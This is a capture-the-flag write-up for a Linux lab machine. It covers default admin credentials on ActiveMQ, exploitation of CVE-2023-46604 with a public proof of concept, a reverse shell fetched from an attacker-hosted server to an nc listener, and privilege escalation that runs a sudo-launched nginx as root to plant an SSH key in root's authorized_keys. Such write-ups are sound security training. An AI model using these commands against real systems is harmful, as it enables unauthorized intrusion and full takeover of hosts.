**OS:** Linux  
**Date:** 11.11.2026

## Enumeration
Our initial scans yields these open ports at the target host:

![](Images/Pasted%20image%2020261111084029.png)

Since there is clearly a web server, we check that out first. There is a login form which we guess admin/admin which works right away. It reveals that the web server is an instance of ActiveMQ, which is a message broker. The admin panel also states that the version is 5.15.15. 

![](Images/Pasted%20image%2020261111084139.png)

We check for vulnerabilities as we want RFE.
## Exploitation
Searching for it reveals a poc for 
CVE-2023-46604: https://github.com/rootsecdev/CVE-2023-46604 with a payload that we need to configure.
We clone the repo and open the xml file:

![](Images/Pasted%20image%2020261111084849.png)

We encode the payload as to not run into issues and attempt the exploit. We set up a web server to serve the xml file with:

```
python3 -m http.server 8000
```
We set up a listener:
```
sudo nc -lvnp 9001
```

We then run the go program:
```
go run main.go -i 10.129.128.6 -p 61616 -u http://10.10.15.33:8000/poc-linux.xml
```

![](Images/Pasted%20image%2020261111091711.png)

And now we have a shell. Let's stabilize it with:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

( then ctrl + z to background process - This will move it to the background and have you be on your attacker machine)
Then:
```
stty raw -echo; fg
```
Also do:
```
export TERM=xterm
```

Then get pretty colors:
```
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '
```
## Post-Exploitation (Privilege Escalation)
Now that we have a shell, we want privesc.
We check manually first and find that we are able to run as sudo with no password:

![](Images/Pasted%20image%2020261111092307.png)

We are able to create a web server with sudo. Let's set up the configuration file and attempt to exploit it.

We copy the nginx.conf file from /etc/nginx/ and look at it with vi:

![](Images/Pasted%20image%2020261111092548.png)

the user www-data can be changed to root, since that is what we want. We go through the rest of the .conf file and remove everything we do not need, as all we really want to do is run a process as root. 

We edit the conf file to look like this:

![](Images/Pasted%20image%2020261111110546.png)

We then save it and attempt to spawn an nginx server with:
```
sudo nginx -c /dev/shm/nginx.conf
```
To test if it works, we do:
```
curl localhost:9002
```

![](Images/Pasted%20image%2020261111110704.png)

And it looks like that works. 
Now what we can do is to put a file to access this web server directly as root. Since our machine is running SSH, it is very easy to upload a SSH-public key that we create on our attacker machine. 

We run on our attacker machine:
```
ssh-keygen -f broker
```

Since we don't like passwords, we just enter to have it blank.
We then attempt to put the public key onto the server with:
```
curl $target:9002/root/.ssh/authorized_keys --upload-file broker.pub
```

We then attempt to logon with ssh from our attacker:
```
ssh -i broker root@$target
```

![](Images/Pasted%20image%2020261111110948.png)

And as we see, we have rooted the box.